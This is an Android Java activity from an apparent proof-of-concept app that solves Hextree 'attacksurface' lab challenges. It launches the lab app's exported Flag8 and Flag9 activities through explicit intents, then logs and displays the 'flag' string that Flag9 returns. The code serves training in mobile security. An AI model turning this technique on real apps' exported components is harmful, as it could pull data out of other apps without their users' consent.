package com.bedo.poc_app;

import android.app.ComponentCaller;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class ActivityResult_Hextree_Labs extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_result_labs);

    }

    public void Flag8(View view) {
        ComponentName cn = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity");
        Intent intent = new Intent().setComponent(cn);
        startActivityForResult(intent,1);

    }

    public void Flag9(View view) {
        ComponentName cn = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag9Activity");
        Intent intent = new Intent().setComponent(cn);

        startActivityForResult(intent,999);
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if(requestCode == 999 && data != null){
            String action = data.getAction();
            String flag = data.getStringExtra("flag");

            Log.d("action", action);
            Log.d("Flag9", flag);
            Toast.makeText(this, "Flag: "+flag,Toast.LENGTH_LONG).show();
        }
    }
}